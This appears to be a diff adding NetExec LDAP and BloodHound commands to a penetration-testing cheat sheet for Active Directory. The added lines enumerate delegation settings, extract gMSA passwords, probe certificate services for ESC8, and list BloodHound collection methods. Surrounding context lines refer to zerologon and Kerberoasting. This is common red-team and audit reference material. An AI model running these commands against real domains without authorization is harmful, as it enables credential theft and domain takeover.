@@ -326,6 +326,8 @@ nx smb <target-ip> -u <username> -p <password> -M zerologon
 ```
 #### LDAP Commands
 ```bash
+# List the DC-IP
+nxc ldap <ip> -u user -p pass --dc-list
 # Enumerate MAQ (Machine Account Quota)
 nxc ldap <dc-ip> -u <username> -p <password> -M maq
 # Enumerate ADCS
@@ -334,6 +336,24 @@ nxc ldap <dc-ip> -u <username> -p <password> -M adcs
 nxc ldap <dc-ip> -u <username> -p <password> -M ldap-checker
 # Enumerate LAPS (Local Administrator Password Solution)
 nxc ldap <dc-ip> -u <username> -p <password> -M laps
+# Enumerate Users for Unconstrained Delegation
+nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
+# Enumerate Users for Misconfigured Delegations
+nxc ldap 192.168.56.11 -u user -p pass --find-delegation
+
+#### LDAP Queries
+nxc ldap <ip> -u username -p password --query "(sAMAccountName=Administrator)" ""
+nxc ldap <ip> -u username -p password --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
+
+#### LDAPS Extract GMSA Password
+nxc ldap <ip> -u <user> -p <pass> --gmsa
+# Extract GMSA Password
+nxc ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
+nxc ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502...snip'
+
+#### ESC8 with NXC
+nxc ldap <ip> -u user -p pass -M adcs
+nxc ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx
 ```
 
 ### Kerberoasting
@@ -366,8 +386,29 @@ GetNPUsers.py -request -usersfile users.txt -format hashcat -outputfile ASREPRoa
 # Collect Active Directory data for analysis in BloodHound.
 bloodhound-python -u <username> -p '<password>' -d <domain> -c All --zip
 
-# Bloodhound with Netexec
+# Bloodhound with Netexec normal method
 nxc ldap <dc-ip> -u <username> -p <password> --bloodhound --collection All
+
+# Bloodhound with Netexec extra methods
+nxc ldap <ip> -u user -p pass --bloodhound --collection Method1,Method2
+
+## Collection Methods
+    Default - Performs group membership collection, domain trust collection, local admin collection, and session collection
+    Group - Performs group membership collection
+    LocalAdmin - Performs local admin collection
+    RDP - Performs Remote Desktop Users collection
+    DCOM - Performs Distributed COM Users collection
+    Container - Performs container collection (GPO/Organizational Units/Default containers)
+    PSRemote - Performs Remote Management (PS Remoting) Users collection
+    DCOnly - Runs all collection methods that can be queried from the DC only, no connection to member hosts/servers needed. This is equal to Group,Acl,Trusts,ObjectProps,Container
+    Session - Performs session collection
+    Acl - Performs ACL collection
+    Trusts - Performs domain trust enumeration
+    LoggedOn - Performs privileged Session enumeration (requires local admin on the target)
+    ObjectProps - Performs Object Properties collection for properties such as LastLogon or PwdLastSet
+    All - Runs all methods above, except LoggedOn
+    Experimental - Connects to individual hosts to enumerate services and scheduled tasks that may have stored credentials
+
 ```
 
 ## Domain Admin Credentials
